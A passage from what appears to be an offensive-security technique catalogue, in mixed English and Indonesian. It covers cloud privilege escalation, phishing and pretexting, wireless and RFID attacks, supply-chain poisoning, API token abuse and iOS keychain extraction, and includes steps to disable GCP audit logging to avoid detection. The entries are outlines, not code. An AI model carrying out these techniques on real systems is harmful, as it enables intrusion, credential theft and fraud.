    ├── eks:AccessKubernetesApi → get cluster access
    ├── kubectl access cluster
    └── Full cluster control
    DETECTION: EKS access
    BYPASS: Use alternate method

18. CODEPIPELINE
    WHAT: Poison CodePipeline
    HOW:
    ├── codepipeline:PutJobSuccessResult → inject code
    ├── Malicious code deployed
    └── Backdoor in production
    DETECTION: Pipeline modification
    BYPASS: Use alternate method

19. CLOUDFORMATION
    WHAT: Modify CloudFormation stack
    HOW:
    ├── cloudformation:UpdateStack → add resources
    ├── Malicious resources deployed
    └── Infrastructure compromised
    DETECTION: Stack modification
    BYPASS: Use alternate method

20. ECS_SECRET
    WHAT: Extract ECS task secrets
    HOW:
    ├── ecs:DescribeTaskDefinition → read secrets
    ├── Extract credentials
    └── Use for further access
    DETECTION: Secret access
    BYPASS: Use alternate method

AZURE (18):

1. AZ_AD
   WHAT: Modify Azure AD
   HOW:
   ├── Microsoft.Graph: Application.ReadWrite.All
   ├── Create application with backdoor
   └── Access via application
   DETECTION: AD changes
   BYPASS: Use alternate method

2. AZ_MANAGED_ID
   WHAT: Impersonate managed identity
   HOW:
   ├── Access managed identity token
   ├── Use token for Azure services
   └── Access as managed identity
   DETECTION: Token usage
   BYPASS: Use alternate method

3. AZ_KEY_VAULT
   WHAT: Extract Key Vault secrets
   HOW:
   ├── Access Key Vault
   ├── GetSecret → read secrets
   └── Extract credentials, keys
   DETECTION: Secret access
   BYPASS: Use alternate method

4. AZ_STORAGE
   WHAT: Access storage account
   HOW:
   ├── Get storage account key
   ├── Access blob storage
   └── Extract data
   DETECTION: Storage access
   BYPASS: Use alternate method

5. AZ_SQL
   WHAT: Access SQL database
   HOW:
   ├── Get SQL admin access
   ├── Query database
   └── Extract data
   DETECTION: SQL access
   BYPASS: Use alternate method

6. AZ_VM
   WHAT: Install VM extension
   HOW:
   ├── az vm extension set → install extension
   ├── Extension runs with SYSTEM access
   └── Full VM control
   DETECTION: Extension installation
   BYPASS: Use alternate method

7. AZ_AKS
   WHAT: Access AKS cluster
   HOW:
   ├── az aks get-credentials → get cluster access
   ├── kubectl access cluster
   └── Full cluster control
   DETECTION: AKS access
   BYPASS: Use alternate method

8. AZ_FUNCTION
   WHAT: Inject Function App code
   HOW:
   ├── Access Function App
   ├── Modify function code
   └── Malicious code executes
   DETECTION: Function modification
   BYPASS: Use alternate method

9. AZ_DEVOPS
   WHAT: Poison Azure DevOps pipeline
   HOW:
   ├── Access DevOps project
   ├── Modify pipeline YAML
   ├── Malicious code deployed
   └── Backdoor in production
   DETECTION: Pipeline modification
   BYPASS: Use alternate method

10. AZ_RESOURCE_GROUP
    WHAT: Access resource group
    HOW:
    ├── az role assignment create → assign role
    ├── Full resource group access
    └── Access all resources
    DETECTION: Role assignment
    BYPASS: Use alternate method

11. AZ_SUBSCRIPTION
    WHAT: Access subscription
    HOW:
    ├── az role assignment create → assign Owner
    ├── Full subscription access
    └── Access all resources
    DETECTION: Role assignment
    BYPASS: Use alternate method

12. AZ_POLICY
    WHAT: Exempt from policy
    HOW:
    ├── az policy assignment create → create exemption
    ├── Security policies bypassed
    └── Operate without restrictions
    DETECTION: Policy exemption
    BYPASS: Use alternate method

13. AZ_ROLE
    WHAT: Assign roles
    HOW:
    ├── az role assignment create → assign role
    ├── Privilege escalation
    └── Access as privileged role
    DETECTION: Role assignment
    BYPASS: Use alternate method

14. AZ_COSMOSDB
    WHAT: Access Cosmos DB
    HOW:
    ├── Get Cosmos DB keys
    ├── Query database
    └── Extract data
    DETECTION: Database access
    BYPASS: Use alternate method

15. AZ_DNS
    WHAT: Manipulate DNS zone
    HOW:
    ├── az network dns record-set create → create record
    ├── Point domain to attacker
    └── Phishing or C2
    DETECTION: DNS changes
    BYPASS: Use alternate method

16. AZ_CDN
    WHAT: Manipulate CDN endpoint
    HOW:
    ├── az cdn endpoint create → create endpoint
    ├── Serve malicious content
    └── Attack users
    DETECTION: CDN changes
    BYPASS: Use alternate method

17. AZ_ARM_TEMPLATE
    WHAT: Inject ARM template
    HOW:
    ├── Create ARM template with backdoor
    ├── Deploy template
    └── Malicious resources deployed
    DETECTION: Template deployment
    BYPASS: Use alternate method

18. AZ_GRAPH
    WHAT: Enumerate Azure AD
    HOW:
    ├── az ad user list → enumerate users
    ├── az ad group list → enumerate groups
    └── Map environment
    DETECTION: Enumeration
    BYPASS: Use alternate method

GCP (16):

1. GCP_IAM
   WHAT: Create service account key
   HOW:
   ├── iam.serviceAccountKeys.create → create key
   ├── Use key for authentication
   └── Access as service account
   DETECTION: Key creation
   BYPASS: Use alternate method

2. GCP_SERVICE_ACCT
   WHAT: Impersonate service account
   HOW:
   ├── iam.serviceAccounts.actAs → impersonate
   ├── Use impersonated identity
   └── Access as service account
   DETECTION: Impersonation
   BYPASS: Use alternate method

3. GCP_COMPUTE
   WHAT: Modify VM metadata
   HOW:
   ├── compute.instances.setMetadata → add SSH key
   ├── SSH into VM
   └── Full VM access
   DETECTION: Metadata changes
   BYPASS: Use alternate method

4. GCP_STORAGE
   WHAT: Access GCS bucket
   HOW:
   ├── storage.objects.create → upload files
   ├── Access bucket data
   └── Extract data
   DETECTION: Bucket access
   BYPASS: Use alternate method

5. GCP_SQL
   WHAT: Access Cloud SQL
   HOW:
   ├── sql.instances.create → create instance
   ├── Access database
   └── Extract data
   DETECTION: SQL instance creation
   BYPASS: Use alternate method

6. GCP_KMS
   WHAT: Decrypt with KMS
   HOW:
   ├── cryptoKey.decrypt → decrypt data
   ├── Access encrypted data
   └── Use for further access
   DETECTION: KMS operations
   BYPASS: Use alternate method

7. GCP_SECRET_MANAGER
   WHAT: Extract secrets
   HOW:
   ├── secretmanager.secrets.get → read secret
   ├── Extract credentials
   └── Use for further access
   DETECTION: Secret access
   BYPASS: Use alternate method

8. GCP_GKE
   WHAT: Access GKE cluster
   HOW:
   ├── container.clusters.getCredentials → get cluster access
   ├── kubectl access cluster
   └── Full cluster control
   DETECTION: GKE access
   BYPASS: Use alternate method

9. GCP_CLOUD_FUNCTION
   WHAT: Create Cloud Function
   HOW:
   ├── cloudfunctions.functions.create → deploy function
   ├── Function executes in GCP
   └── Backdoor in serverless
   DETECTION: Function creation
   BYPASS: Use alternate method

10. GCP_BIGQUERY
    WHAT: Query BigQuery
    HOW:
    ├── bigquery.jobs.create → run query
    ├── Extract data
    └── Exfiltrate large datasets
    DETECTION: BigQuery queries
    BYPASS: Use alternate method

11. GCP_PUBSUB
    WHAT: Publish to Pub/Sub
    HOW:
    ├── pubsub.topics.publish → publish message
    ├── Trigger functions
    └── Data exfiltration
    DETECTION: Pub/Sub publish
    BYPASS: Use alternate method

12. GCP_FIRESTORE
    WHAT: Access Firestore
    HOW:
    ├── firestore.documents.get → read documents
    ├── Extract data
    └── Modify data
    DETECTION: Firestore access
    BYPASS: Use alternate method

13. GCP_LOGGING
    WHAT: Purge/mutate audit logs & sink
    HOW:
    ├── logging.sinks.delete → hapus log sink
    ├── Clear log entries (blind the blue team)
    └── Reconfigure sink ke attacker-controlled export
    DETECTION: Sink deletion + audit log gap
    BYPASS: Direct API (cloudresourcemanager) bila console terblokir

14. GCP_AUDIT_CONFIG
    WHAT: Modify auditConfigs untuk membutakan audit trail
    HOW:
    ├── Modify auditConfigs pada project/folder/organization
    ├── Set service data access audit ke empty/DISABLED
    └── Lakukan eksfiltrasi tanpa jejak audit
    DETECTION: Perubahan auditConfigs (delta audit)
    BYPASS: Restore auditConfigs + re-enable setelah aksi selesai

15. GCP_ORGANIZATION
    WHAT: Bobol kebijakan level organization
    HOW:
    ├── orgPolicy.disable → nonaktifkan constraint
    ├── resourcemanager.organizations.getIamPolicy → baca policy
    └── Escalate ke folder/project turunan
    DETECTION: Org policy disable + IAM drift
    BYPASS: Target folder-level policy bila org-level terblokir

16. GCP_PROJECT
    WHAT: Kuasai project resources
    HOW:
    ├── resourcemanager.projects.update → ubah project metadata
    ├── resourcemanager.projects.move → pindahkan project ke container attacker
    └── Re-point billing/key project untuk eksfiltrasi
    DETECTION: Project metadata change
    BYPASS: Use alternate method
```

**Fallback:**
```
AWS IAM → Lambda → S3 → EC2 → Azure AD → Key Vault →
GCP IAM → Compute → Storage → GCP Logging → GCP Audit → ALERT
```

---

### 29.3 Social Engineering

```
PHISHING (8):

1. EMAIL_PHISH
   WHAT: Crafted email dengan malicious attachment/link
   HOW:
   ├── Create phishing email template
   ├── Attach malicious document (macro, exploit)
   ├── Or include phishing link
   ├── Send to target list
   └── Harvest credentials atau deliver payload
   DETECTION: Email security gateway
   BYPASS: Use alternate method

2. SPEAR_PHISH
   WHAT: Targeted email ke individu spesifik
   HOW:
   ├── Research target (LinkedIn, social media)
   ├── Create personalized email
   ├── Reference recent events/projects
   ├── Include relevant attachments
   └── Higher success rate
   DETECTION: Email security gateway
   BYPASS: Use alternate method

3. WHALING
   WHAT: Target C-level executives
   HOW:
   ├── Research executive (public info)
   ├── Create urgent email (CEO fraud, wire transfer)
   ├── Spoof sender address
   ├── Include time pressure
   └── High-value target
   DETECTION: Email security gateway
   BYPASS: Use alternate method

4. CLONE_PHISH
   WHAT: Clone legitimate email → replace link/attachment
   HOW:
   ├── Intercept legitimate email
   ├── Clone email content
   ├── Replace link/attachment dengan malicious
   ├── Send ke same recipients
   └── Appears legitimate
   DETECTION: Email security gateway
   BYPASS: Use alternate method

5. VISHING
   WHAT: Voice phishing (phone call)
   HOW:
   ├── Spoof caller ID
   ├── Impersonate IT support/vendor
   ├── Request credentials or remote access
   ├── Use social engineering tactics
   └── Harvest information
   DETECTION: Call monitoring
   BYPASS: Use alternate method

6. SMISHING
   WHAT: SMS phishing
   HOW:
   ├── Send SMS dengan malicious link
   ├── Impersonate bank/company
   ├── Create urgency
   ├── Link ke phishing page
   └── Harvest credentials
   DETECTION: SMS filtering
   BYPASS: Use alternate method

7. QR_PHISH
   WHAT: QR code phishing
   HOW:
   ├── Create malicious QR code
   ├── Link ke phishing page
   ├── Place QR code di public areas
   ├── Target scans QR code
   └── Harvest credentials
   DETECTION: QR code scanning
   BYPASS: Use alternate method

8. PHISHING_KIT
   WHAT: Pre-built phishing pages
   HOW:
   ├── Use commercial phishing kit
   ├── Customize for target
   ├── Deploy ke hosting
   ├── Redirect target ke kit
   └── Harvest credentials
   DETECTION: Web security gateway
   BYPASS: Use alternate method

PRETEXTING (5):

1. HELPDESK_IMPERSON
   WHAT: Impersonate IT support
   HOW:
   ├── Call target
   ├── Claim IT support
   ├── Request credentials for "verification"
   ├── Use urgency
   └── Harvest credentials
   DETECTION: Call monitoring
   BYPASS: Use alternate method

2. VENDOR_IMPERSON
   WHAT: Impersonate vendor/partner
   HOW:
   ├── Research vendor relationship
   ├── Call/email target
   ├── Claim vendor support
   ├── Request access/information
   └── Harvest data
   DETECTION: Vendor verification
   BYPASS: Use alternate method

3. EXECUTIVE_IMPERSON
   WHAT: Impersonate C-level executive
   HOW:
   ├── Research executive
   ├── Send email/call target
   ├── Claim executive authority
   ├── Request urgent action
   └── Harvest data/access
   DETECTION: Executive verification
   BYPASS: Use alternate method

4. NEW_EMPLOYEE
   WHAT: New hire pretext
   HOW:
   ├── Claim new employee
   ├── Request access/onboarding
   ├── Need credentials for "setup"
   ├── Harvest credentials
   └── Access systems
   DETECTION: HR verification
   BYPASS: Use alternate method

5. MAINTENANCE
   WHAT: Maintenance window pretext
   HOW:
   ├── Claim maintenance window
   ├── Need to verify credentials
   ├── Request access for "maintenance"
   ├── Harvest credentials
   └── Access systems
   DETECTION: Maintenance verification
   BYPASS: Use alternate method

OSINT_FOR_SE (6):

1. SOCIAL_MEDIA
   WHAT: LinkedIn, Facebook, Instagram recon
   HOW:
   ├── Scrape LinkedIn profiles
   ├── Find organizational structure
   ├── Identify email patterns
   ├── Gather personal information
   └── Use for targeted attacks
   DETECTION: Social media monitoring
   BYPASS: Use alternate method

2. EMAIL_HARVEST
   WHAT: Email collection dari public sources
   HOW:
   ├── Scrape company website
   ├── Check email format (first.last@domain)
   ├── Verify emails (hunter.io)
   └── Build target list
   DETECTION: Email harvesting detection
   BYPASS: Use alternate method

3. PHONE_HARVEST
   WHAT: Phone number collection
   HOW:
   ├── Scrape company website
   ├── Check social media profiles
   ├── Build phone list
   └── Use for vishing
   DETECTION: Phone number monitoring
   BYPASS: Use alternate method

4. ORG_CHART
   WHAT: Organization structure mapping
   HOW:
   ├── LinkedIn research
   ├── Company website
   ├── Press releases
   ├── Identify key personnel
   └── Map reporting structure
   DETECTION: Org chart monitoring
   BYPASS: Use alternate method

5. TECH_STACK
   WHAT: Technology stack identification
   HOW:
   ├── Shodan/Censys research
   ├── Job postings (list technologies)
   ├── GitHub repositories
   ├── Identify vulnerable technologies
   └── Target specific vulnerabilities
   DETECTION: Technology monitoring
   BYPASS: Use alternate method

6. VENDOR_RECON
   WHAT: Vendor/partner reconnaissance
   HOW:
   ├── Research vendor relationships
   ├── Identify vendor contacts
   ├── Find vendor vulnerabilities
   ├── Use for supply chain attacks
   └── Impersonate vendor
   DETECTION: Vendor monitoring
   BYPASS: Use alternate method

CAMPAIGN (4):

1. GOPHISH_INTEGRATE
   WHAT: GoPhish integration
   HOW:
   ├── Import target list ke GoPhish
   ├── Create phishing campaign
   ├── Configure email templates
   ├── Track results
   └── Harvest credentials
   DETECTION: Email security gateway
   BYPASS: Use alternate method

2. CAMPAIGN_TRACK
   WHAT: Campaign tracking (opens, clicks)
   HOW:
   ├── Track email opens
   ├── Track link clicks
   ├── Track credential submissions
   ├── Generate report
   └── Measure success
   DETECTION: Tracking pixels
   BYPASS: Use alternate method

3. CREDENTIAL_HARVEST
   WHAT: Credential capture
   HOW:
   ├── Deploy phishing page
   ├── Capture submitted credentials
   ├── Store ke database
   └── Use for further access
   DETECTION: Credential monitoring
   BYPASS: Use alternate method

4. PAYLOAD_DELIVERY
   WHAT: Payload delivery via phishing
   HOW:
   ├── Attach malicious document
   ├── Include macro/exploit
   ├── Target opens document
   ├── Macro/exploit executes
   └── Payload delivered
   DETECTION: Email security gateway
   BYPASS: Use alternate method
```

**Fallback:**
Email Phish → Spear Phish → Vishing → Smishing → QR Phish →
Pretexting → Physical Access → ALERT

---

### 29.4 Wireless Attacks

```
WIFI (8):

1. EVIL_TWIN
   WHAT: Create rogue AP dengan same SSID
   HOW:
   ├── Create rogue AP dengan SSID target
   ├── Deauth clients dari legitimate AP
   ├── Clients connect ke rogue AP
   ├── MITM traffic
   └── Harvest credentials
   DETECTION: Wireless IDS
   BYPASS: Use alternate method

2. DEAUTH_ATTACK
   WHAT: Deauthentication flood
   HOW:
   ├── Send deauth frames ke target
   ├── Clients disconnected
   ├── Clients reconnect ke rogue AP
   └── Harvest credentials
   DETECTION: Deauth detection
   BYPASS: Use alternate method

3. WPA3_ATTACK
   WHAT: WPA3 downgrade attack
   HOW:
   ├── Force downgrade ke WPA2
   ├── Capture handshake
   ├── Crack password
   └── Access network
   DETECTION: WPA3 downgrade detection
   BYPASS: Use alternate method

4. HANDSHAKE_CAPTURE
   WHAT: Capture 4-way handshake
   HOW:
   ├── Deauth client
   ├── Client reconnects
   ├── Capture handshake
   ├── Crack offline
   └── Get password
   DETECTION: Handshake capture detection
   BYPASS: Use alternate method

5. PMKID_ATTACK
   WHAT: PMKID capture (no client needed)
   HOW:
   ├── Send association request
   ├── AP responds with PMKID
   ├── Capture PMKID
   ├── Crack offline
   └── Get password
   DETECTION: PMKID capture detection
   BYPASS: Use alternate method

6. CREDENTIAL_HARVEST
   WHAT: Captive portal credential steal
   HOW:
   ├── Create captive portal
   ├── Redirect clients ke portal
   ├── Portal requests credentials
   ├── Harvest credentials
   └── Forward ke legitimate site
   DETECTION: Captive portal detection
   BYPASS: Use alternate method

7. ROGUE_DHCP
   WHAT: DHCP rogue server
   HOW:
   ├── Respond to DHCP requests
   ├── Assign IP addresses
   ├── Set gateway ke rogue
   ├── MITM traffic
   └── Harvest data
   DETECTION: Rogue DHCP detection
   BYPASS: Use alternate method

8. KARMA_ATTACK
   WHAT: Karma AP (respond to any SSID)
   HOW:
   ├── Respond to any SSID probe
   ├── Client connects
   ├── MITM traffic
   └── Harvest data
   DETECTION: Karma detection
   BYPASS: Use alternate method

BLUETOOTH (5):

1. BT_SCAN
   WHAT: Device discovery
   HOW:
   ├── Scan for Bluetooth devices
   ├── Enumerate device information
   ├── Identify targets
   └── Gather information
   DETECTION: Bluetooth scanning
   BYPASS: Use alternate method

2. BT_SNIFF
   WHAT: Traffic capture
   HOW:
   ├── Pair with target
   ├── Capture Bluetooth traffic
   ├── Decode packets
   └── Extract data
   DETECTION: Bluetooth sniffing
   BYPASS: Use alternate method

3. BT_INJECT
   WHAT: Packet injection
   HOW:
   ├── Pair with target
   ├── Inject malicious packets
   ├── Execute commands
   └── Access device
   DETECTION: Bluetooth injection
   BYPASS: Use alternate method

4. BT_SPAM
   WHAT: Bluetooth spam (overwhelm target)
   HOW:
   ├── Send multiple pairing requests
   ├── Overwhelm target
   ├── Cause denial of service
   └── Disable Bluetooth
   DETECTION: Bluetooth spam
   BYPASS: Use alternate method

5. BT_PAIRING
   WHAT: Pairing attack
   HOW:
   ├── Force pairing with target
   ├── Intercept pairing process
   ├── Capture pairing data
   └── Access device
   DETECTION: Pairing attack
   BYPASS: Use alternate method

RFID/NFC (4):

1. RFID_CLONE
   WHAT: Clone RFID badge
   HOW:
   ├── Read badge dengan Proxmark3
   ├── Extract badge data
   ├── Write to blank badge
   └── Use cloned badge
   DETECTION: RFID cloning
   BYPASS: Use alternate method

2. RFID_EMULATE
   WHAT: Emulate RFID badge
   HOW:
   ├── Read badge data
   ├── Load ke Proxmark3
   ├── Emulate badge
   └── Use emulated badge
   DETECTION: RFID emulation
   BYPASS: Use alternate method

3. NFC_RELAY
   WHAT: NFC relay attack
   HOW:
   ├── Place reader near badge
   ├── Relay data ke writer
   ├── Writer presents ke reader
   └── Access granted
   DETECTION: NFC relay
   BYPASS: Use alternate method

4. NFC_DUMP
   WHAT: NFC tag dump
   HOW:
   ├── Read NFC tag
   ├── Extract data
   ├── Analyze content
   └── Use for further attacks
   DETECTION: NFC reading
   BYPASS: Use alternate method

TOOLS (5):

1. PROXMARK3
   WHAT: RFID/NFC tool
   HOW:
   ├── Read RFID/NFC tags
   ├── Clone tags
   ├── Emulate tags
   └── Relay attacks
   DETECTION: Proxmark3 usage
   BYPASS: Use alternate tool

2. HACKRF
   WHAT: SDR (Software Defined Radio)
   HOW:
   ├── Transmit/receive radio signals
   ├── Capture wireless signals
   ├── Replay signals
   └── Jam signals
   DETECTION: SDR usage
   BYPASS: Use alternate tool

3. WIFI_PINEAPPLE
   WHAT: WiFi attack platform
   HOW:
   ├── Create rogue AP
   ├── Deauth clients
   ├── Capture handshakes
   └── Harvest credentials
   DETECTION: WiFi Pineapple detection
   BYPASS: Use alternate tool

4. BLUETOOTH_SDR
   WHAT: Bluetooth SDR
   HOW:
   ├── Capture Bluetooth traffic
   ├── Inject packets
   ├── Analyze protocols
   └── Exploit vulnerabilities
   DETECTION: Bluetooth SDR usage
   BYPASS: Use alternate tool

5. UHF_READER
   WHAT: UHF RFID reader
   HOW:
   ├── Read UHF RFID tags
   ├── Extract data
   ├── Clone tags
   └── Use for access control
   DETECTION: UHF reader usage
   BYPASS: Use alternate tool
```

**Fallback:**
Evil Twin → Deauth → Handshake → PMKID →
Captive Portal → Bluetooth → RFID/NFC → ALERT

---

### 29.5 Supply Chain

```
DEPENDENCY (6):

1. NPM_POISON
   WHAT: Malicious npm package
   HOW:
   ├── Create malicious package
   ├── Name similarity (typosquatting)
   ├── Publish ke npm registry
   ├── Users install package
   └── Backdoor executes
   DETECTION: npm audit, dependency scanning
   BYPASS: Use alternate method

2. PYPI_POISON
   WHAT: Malicious PyPI package
   HOW:
   ├── Create malicious package
   ├── Name similarity (typosquatting)
   ├── Publish ke PyPI
   ├── Users pip install
   └── Backdoor executes
   DETECTION: pip audit, dependency scanning
   BYPASS: Use alternate method

3. GO_MODULE
   WHAT: Malicious Go module
   HOW:
   ├── Create malicious module
   ├── Name similarity
   ├── Publish ke Go module proxy
   ├── Users go get
   └── Backdoor executes
   DETECTION: go mod audit, dependency scanning
   BYPASS: Use alternate method

4. RUBY_GEM
   WHAT: Malicious Ruby gem
   HOW:
   ├── Create malicious gem
   ├── Name similarity
   ├── Publish ke RubyGems
   ├── Users gem install
   └── Backdoor executes
   DETECTION: bundler-audit, dependency scanning
   BYPASS: Use alternate method

5. MAVEN
   WHAT: Malicious Maven artifact
   HOW:
   ├── Create malicious artifact
   ├── Name similarity
   ├── Publish ke Maven Central
   ├── Users maven install
   └── Backdoor executes
   DETECTION: dependency scanning
   BYPASS: Use alternate method

6. NUGET
   WHAT: Malicious NuGet package
   HOW:
   ├── Create malicious package
   ├── Name similarity
   ├── Publish ke NuGet
   ├── Users dotnet add package
   └── Backdoor executes
   DETECTION: dependency scanning
   BYPASS: Use alternate method

CI_CD (6):

1. GITHUB_ACTIONS
   WHAT: Malicious GitHub Actions workflow
   HOW:
   ├── Create malicious workflow
   ├── Target repository
   ├── Workflow executes
   ├── Backdoor deployed
   └── Access repository
   DETECTION: Workflow audit
   BYPASS: Use alternate method

2. GITLAB_CI
   WHAT: Malicious .gitlab-ci.yml
   HOW:
   ├── Create malicious CI config
   ├── Target repository
   ├── Pipeline executes
   ├── Backdoor deployed
   └── Access repository
   DETECTION: CI config audit
   BYPASS: Use alternate method

3. JENKINS
   WHAT: Malicious Jenkinsfile
   HOW:
   ├── Create malicious Jenkinsfile
   ├── Target repository
   ├── Pipeline executes
   ├── Backdoor deployed
   └── Access Jenkins
   DETECTION: Jenkinsfile audit
   BYPASS: Use alternate method

4. AZURE_PIPELINES
   WHAT: Malicious azure-pipelines.yml
   HOW:
   ├── Create malicious pipeline config
   ├── Target repository
   ├── Pipeline executes
   ├── Backdoor deployed
   └── Access Azure DevOps
   DETECTION: Pipeline config audit
   BYPASS: Use alternate method

5. CIRCLECI
   WHAT: Malicious .circleci/config.yml
   HOW:
   ├── Create malicious config
   ├── Target repository
   ├── Pipeline executes
   ├── Backdoor deployed
   └── Access CircleCI
   DETECTION: Config audit
   BYPASS: Use alternate method

6. BITBUCKET
   WHAT: Malicious bitbucket-pipelines.yml
   HOW:
   ├── Create malicious config
   ├── Target repository
   ├── Pipeline executes
   ├── Backdoor deployed
   └── Access Bitbucket
   DETECTION: Config audit
   BYPASS: Use alternate method

PACKAGE_MANAGER (4):

1. HOMEBREW
   WHAT: Malicious Homebrew formula
   HOW:
   ├── Create malicious formula
   ├── Submit ke Homebrew tap
   ├── Users brew install
   └── Backdoor executes
   DETECTION: Formula audit
   BYPASS: Use alternate method

2. CHOCOLATEY
   WHAT: Malicious Chocolatey package
   HOW:
   ├── Create malicious package
   ├── Submit ke Chocolatey
   ├── Users choco install
   └── Backdoor executes
   DETECTION: Package audit
   BYPASS: Use alternate method

3. APT_REPO
   WHAT: Malicious APT repository
   HOW:
   ├── Create malicious repository
   ├── Add signing key
   ├── Users apt install
   └── Backdoor executes
   DETECTION: Repository audit
   BYPASS: Use alternate method

4. YUM_REPO
   WHAT: Malicious YUM repository
   HOW:
   ├── Create malicious repository
   ├── Add signing key
   ├── Users yum install
   └── Backdoor executes
   DETECTION: Repository audit
   BYPASS: Use alternate method

BUILD_SYSTEM (6):

1. MAKEFILE
   WHAT: Malicious Makefile
   HOW:
   ├── Inject malicious commands
   ├── make executes commands
   ├── Backdoor deployed
   └── Access system
   DETECTION: Makefile audit
   BYPASS: Use alternate method

2. CMAKE
   WHAT: Malicious CMakeLists.txt
   HOW:
   ├── Inject malicious commands
   ├── cmake executes commands
   ├── Backdoor deployed
   └── Access system
   DETECTION: CMake audit
   BYPASS: Use alternate method

3. GRADLE
   WHAT: Malicious build.gradle
   HOW:
   ├── Inject malicious tasks
   ├── gradle executes tasks
   ├── Backdoor deployed
   └── Access system
   DETECTION: Gradle audit
   BYPASS: Use alternate method

4. MSBUILD
   WHAT: Malicious .csproj
   HOW:
   ├── Inject malicious targets
   ├── msbuild executes targets
   ├── Backdoor deployed
   └── Access system
   DETECTION: MSBuild audit
   BYPASS: Use alternate method

5. DOCKERFILE
   WHAT: Malicious Dockerfile (base image injection)
   HOW:
   ├── Inject RUN/ENTRYPOINT/CMD ke base image
   ├── docker build executes payload
   ├── Backdoor baked ke built image
   └── Container runs kekompromi
   DETECTION: Image scanning (Trivy, Grype, Snyk Container)
   BYPASS: Use alternate method

6. PRE_COMMIT
   WHAT: Malicious .pre-commit-config.yaml / hook script
   HOW:
   ├── Inject malicious script ke pre-commit hook
   ├── Developer commits → hook executes
   ├── Backdoor exfil / keystroke capture
   └── Data exfiltrated via Git push
   DETECTION: Hook script audit, pre-commit output inspection
   BYPASS: Use alternate method
```

**Fallback Chain:**
Dependency Poison → CI/CD Compromise → Package Manager →
Build System (Makefile/CMake/Gradle/MSBuild/Dockerfile/Pre-commit) → ALERT

---

### 29.6 API Security Deep

```
AUTH_ABUSE (8):

1. OAUTH_REDIRECT
   WHAT: OAuth redirect URI manipulation
   HOW:
   ├── Intercept OAuth flow
   ├── Modify redirect_uri parameter
   ├── Authorization code sent ke attacker
   ├── Exchange code for token
   └── Access user account
   DETECTION: Redirect URI validation
   BYPASS: Use alternate method

2. OAUTH_SCOPE
   WHAT: OAuth scope escalation
   HOW:
   ├── Request minimal scope
   ├── After authorization, modify scope
   ├── Add privileged scopes
   └── Access elevated privileges
   DETECTION: Scope validation
   BYPASS: Use alternate method

3. OAUTH_TOKEN
   WHAT: OAuth token theft/reuse
   HOW:
   ├── Intercept access token
   ├── Use token ke API
   ├── Access user resources
   └── Token reuse
   DETECTION: Token reuse detection
   BYPASS: Use alternate method

4. JWT_NONE
   WHAT: JWT alg:none attack
   HOW:
   ├── Intercept JWT
   ├── Modify header: alg: "none"
   ├── Modify payload
   ├── Remove signature
   └── API accepts token
   DETECTION: Algorithm validation
   BYPASS: Use alternate method

5. JWT_WEAK
   WHAT: JWT weak secret brute force
   HOW:
   ├── Intercept JWT
   ├── Extract signature
   ├── Brute force secret
   ├── Found secret
   └── Forge new tokens
   DETECTION: Brute force detection
   BYPASS: Use alternate method

6. JWT_KID
   WHAT: JWT kid injection
   HOW:
   ├── Intercept JWT
   ├── Modify kid parameter
   ├── Point ke file read (../../etc/passwd)
   ├── Server reads file
   └── Extract data
   DETECTION: Kid parameter validation
   BYPASS: Use alternate method

7. JWT_KEY_CONFUSION
   WHAT: JWT RSA/HMAC key confusion
   HOW:
   ├── Intercept JWT (RSA signed)
   ├── Download public key
   ├── Sign token with public key as HMAC secret
   ├── Server validates with public key
   └── Token accepted
   DETECTION: Algorithm validation
   BYPASS: Use alternate method

8. API_KEY
   WHAT: API key extraction/reuse
   HOW:
   ├── Find API keys di source code
   ├── Extract API keys dari logs
   ├── Reuse API key
   └── Access API
   DETECTION: API key reuse detection
   BYPASS: Use alternate method

BUSINESS_LOGIC (6):

1. RATE_BYPASS
   WHAT: Rate limit bypass (race condition)
   HOW:
   ├── Send concurrent requests
   ├── Bypass rate limit
   ├── Make unlimited requests
   └── Brute force
   DETECTION: Rate limit bypass detection
   BYPASS: Use alternate method

2. PRICE_MANIP
   WHAT: Price manipulation
   HOW:
   ├── Intercept purchase request
   ├── Modify price parameter
   ├── Submit modified request
   └── Purchase at reduced price
   DETECTION: Price validation
   BYPASS: Use alternate method

3. QUANTITY_MANIP
   WHAT: Quantity manipulation
   HOW:
   ├── Intercept purchase request
   ├── Modify quantity (negative value)
   ├── Submit modified request
   └── Receive credit
   DETECTION: Quantity validation
   BYPASS: Use alternate method

4. IDOR
   WHAT: Insecure Direct Object Reference
   HOW:
   ├── Find API endpoint: /api/users/123
   ├── Modify ID: /api/users/124
   ├── Access other user's data
   └── Data exposure
   DETECTION: IDOR detection
   BYPASS: Use alternate method

5. FUNCTION_LEAK
   WHAT: Hidden function discovery
   HOW:
   ├── Enumerate API endpoints
   ├── Find hidden functions
   ├── Access undocumented endpoints
   └── Exploit vulnerabilities
   DETECTION: API discovery detection
   BYPASS: Use alternate method

6. WORKFLOW_ABUSE
   WHAT: Workflow step bypass
   HOW:
   ├── Find workflow steps
   ├── Skip steps
   ├── Access final step directly
   └── Bypass validation
   DETECTION: Workflow validation
   BYPASS: Use alternate method

INJECTION (5):

1. NOSQL_API
   WHAT: NoSQL injection via API
   HOW:
   ├── Send malicious JSON
   ├── Inject NoSQL operators
   ├── Bypass authentication
   └── Extract data
   DETECTION: Input validation
   BYPASS: Use alternate method

2. GRAPHQL_INTROSPECT
   WHAT: GraphQL introspection
   HOW:
   ├── Send introspection query
   ├── Get full schema
   ├── Find all types/queries
   └── Exploit vulnerabilities
   DETECTION: Introspection detection
   BYPASS: Use alternate method

3. GRAPHQL_DEPTH
   WHAT: GraphQL depth abuse (DoS)
   HOW:
   ├── Send deeply nested query
   ├── Server processes recursively
   ├── Resource exhaustion
   └── Denial of service
   DETECTION: Query depth limiting
   BYPASS: Use alternate method

4. XML_ENTITY
   WHAT: XXE via API
   HOW:
   ├── Send XML request
   ├── Include external entity
   ├── Server processes entity
   └── Data extraction
   DETECTION: XXE detection
   BYPASS: Use alternate method

5. JSON_INJECTION
   WHAT: JSON parameter pollution
   HOW:
   ├── Send duplicate JSON keys
   ├── Server processes both
   ├── Unexpected behavior
   └── Data manipulation
   DETECTION: JSON validation
   BYPASS: Use alternate method
```

**Fallback:**
OAuth Redirect → Scope Escalation → JWT Attack → API Key →
Rate Limit Bypass → IDOR → Injection → ALERT

---

### 29.7 Mobile Deep (iOS/Android)

```
IOS (10):

1. KEYCHAIN_DUMP
   WHAT: Keychain credential extraction
   HOW:
   ├── Access keychain database
   ├── Decrypt keychain items
   ├── Extract passwords, tokens
   └── Use for further access
   DETECTION: Keychain access
   BYPASS: Use alternate method

